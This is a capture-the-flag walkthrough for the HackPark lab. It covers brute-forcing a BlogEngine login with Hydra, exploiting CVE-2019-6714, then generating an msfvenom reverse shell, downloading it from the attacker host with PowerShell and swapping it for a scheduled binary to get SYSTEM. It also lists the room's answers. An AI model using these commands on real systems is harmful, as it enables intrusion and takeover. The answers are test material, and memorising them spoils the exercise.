# HackPark

## Task 1 Deploy

**2. What's the name of the clown displayed on the homepage?**

```
Pennywise
```

## Task 2 Using Hydra to Brute-Force a Login

The login page is located at `http://$IP/Account/login.aspx?ReturnURL=/admin/` 

**1. What request type is the Windows website login form using?**

```
POST
```

**2. Use Hydra to bruteforce the login. What is the password?**

We use `admin` as the username and use a wordlist to brute-force the password.

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.104.218 http-post-form "/Account/login.aspx?ReturnRUL=/admin:__VIEWSTATE=M8wswOR4ZainhZGJXbBkESyeeoLj6xy%2B%2BK9XvsOXIA8neNAbPsStGmz7IFndSF6pmzKwiiH0puuStmdQgCeAVOa9TdYMyXNh0f2qL7CfIMfzi0EmlPr2dMt029ggPgYWRYpH3Q83EdxJ04MOF%2Bmz0w3nTS894VH%2BsyKYfuoX4iqN5S7QtKek6Uha1Tu6CJazDjwqmbwFO7lMfBYHtY%2FQz7%2FL0n%2BA5lOuavdb7Mld8wjcO3AgZRTiQ3mChNBKhcGoATu2QqtQTca9hhI4qPteSLn%2B83KaY1GI6eAMGL0Zsw1bDzfIf1izwpgHPfaHg1myRUs9IpAcjBFnfG2amOiWzgQCdAHv%2B2uCux8s0M%2F6Cz6OfYqh&__EVENTVALIDATION=Fy1OHAR8bWB5XuX2mus2R0CgFC0HcUrdhY%2FCFeWMd78mkVHoFWVyogl7HWxcRNUABQk9Aj%2BAT%2BjtlYh0LmKwuEGfw3cLFaV10FVhf%2BO6qUdI9EtYQCn5yyZrIIfpuy4HxreQNDEMfTLd7BYIeFoqQgToXCwHPCJkXL4Hki%2BrJ7zMBXBA&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```
Within the quotation marks, the `/Account/login/aspx?ReturnURL=/admin` was taken from the URL with attempting to login with `admin:admin`. After the colon is the cookie intercepted by Burpsuite when attempting to login. Towards the end of the string, we have to include `^USER^` and `^PASS^`, and after the last colon, include `Login Failed`. The password is `1qaz2wsx`.

## Task 3 Compromise The Machine

**1. What version of blogengine is running?**

Upon logging in, navigating to the About page reveals the blogengine version running: `3.3.6.0`.

**2. What is the CVE?**

```
CVE-2019-6714
```

**3. Who is the webserver running as?**

Following the instructions in the exploit comments, we get a shell after setting up a netcat listener and navigating to the URL specified.

```
whoami
iis apppool\blog
```

## Task 4 Windows Privilege Escalation

**1. Generate a reverse shell with msvenom.**

Generate exploit
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.4.248 LPORT=9001 -f exe > shell.exe
```

With our existing shell on the box, pull it down with a PowerShell command (must start python server locally first).

```
powershell -c "Invoke-WebRequest -Uri 'http://10.11.4.248:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
```

Start metasploit and set up listner.

```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT <port set when generating exploit>
run
```

On the victim machine, start `shell.exe` process

```
Start-Process "shell.exe"
```

We now have a meterpreter session.

**2. What is the OS version?**

```
sysinfo
```

**3. What is the name of the abnormal _service_ running?**

Look at all the running processes, we see there is a scheduler, meaning something is being scheduled. Navigate to `C:\Program Files (x86)\SystemScheduler\Events` and cat `20198415519.INI_LOG.txt` to see what is being scheduled, which is `Message.exe`.

The abnorma service running isn't "abnormal", but it's WScheduler.exe, and the answer is `WindowsScheduler.exe` for some reason.

**4. What is the name of the binary to exploit?**

```
Message.exe
```

**5. Using the service, elevate privs. What is the user flag?**

Download the shell.exe file to `C:\Program Files (x86)\SystemScheduler` and rename Message.exe to Message.bak to keep a copy, then rename shell.exe to MAeeage.exe. Make sure a listener is ready for the callback. With our new shell, we have system privs. The user flag is located in `C:\Users\jeff\Desktop`.

**6. What is the root flag?**

The root flag is located in `C:\Users\Administrator\Desktop`.

## Task 5 Priv Esc Without Metasploit

We can do the same thing without metasploit by just creating a payload with `windows/shell_reverse_tcp` and listening for it with netcat.

**3. What was the original install time?**

Wasn't sure what install time was referring to, so I checked Install time of Message.exe, which didn't match the answer. I then checked the OS install time.

```
systeminfo | find /i "original"
```

